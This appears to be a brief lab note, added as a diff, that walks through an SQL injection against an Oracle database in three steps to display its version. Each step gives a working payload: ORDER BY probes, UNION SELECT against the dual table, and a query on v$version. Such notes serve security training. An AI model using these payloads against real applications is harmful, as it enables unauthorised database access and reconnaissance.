@@ -1,0 +1,18 @@
+Do a SQLi on an Oracle Db
+
+Objective: Display the version on Oracle trough SLQi
+
+STEP 1: Determining the number of columns
+
+Payload: ' Order by 1 -- , 'Order by 2 --
+
+STEP 2: Determining the type of data the columns can contain :
+
+- On Oracle the statement FROM must appear on every query
+- There is a built-in table called dual
+
+Payload: ' UNION SELECT 'a', NULL FROM dual --, ' UNION SELECT 'a', 'a' FROM dual --
+
+ STEP 3: Print out the version of the Oracle's DB:
+
+ Payload: ' UNION SELECT banner , NULL FROM v$version--
